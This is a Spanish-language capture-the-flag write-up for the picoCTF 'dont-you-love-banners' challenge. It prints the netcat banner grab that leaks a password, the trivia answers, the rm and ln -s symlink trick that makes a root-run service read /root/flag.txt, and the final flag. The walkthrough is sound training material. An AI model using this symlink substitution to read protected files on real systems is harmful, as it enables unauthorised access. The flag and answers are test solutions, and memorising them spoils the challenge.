# dont-you-love-banners

## Descripcion

Can you abuse the banner?
The server has been leaking some crucial information on `tethys.picoctf.net 58478`. Use the leaked information to get to the server.
To connect to the running application use `nc tethys.picoctf.net 59010`. From the above information abuse the machine and find the flag in the /root directory

## Solucion

ingresamos con el comando dado pero no tenemos contraseña

`giselle_maz-picoctf@webshell:~$ nc [tethys.picoctf.net](http://tethys.picoctf.net/) 59010`

---

**`WELCOME****`

---

`what is the password?`

abrimos segunda ventana de shell y ponemos el comando hacia otro puerto (*Port Scanning* manual

), nos da un pswrd

```jsx
giselle_maz-picoctf@webshell:~$ nc [tethys.picoctf.net](http://tethys.picoctf.net/) 58478
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

volvemos al puerto 59010 y ponemos la contraseña

`giselle_maz-picoctf@webshell:~$ nc [tethys.picoctf.net](http://tethys.picoctf.net/) 59010`

---

**`WELCOME****`

---

`what is the password?
My_Passw@rd_@1234`

respondemos preguntas

`What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper`

hacemos secuestro de flujo de archivos y remplazamos el archivo por uno al que si tenemos permisos.
`player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ exit
exit
logout`

y luego volvemos a conectarnos y nos da la flag

```jsx
giselle_maz-picoctf@webshell:~$ nc [tethys.picoctf.net](http://tethys.picoctf.net/) 59010
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```

## Nots adicionales

## Referencias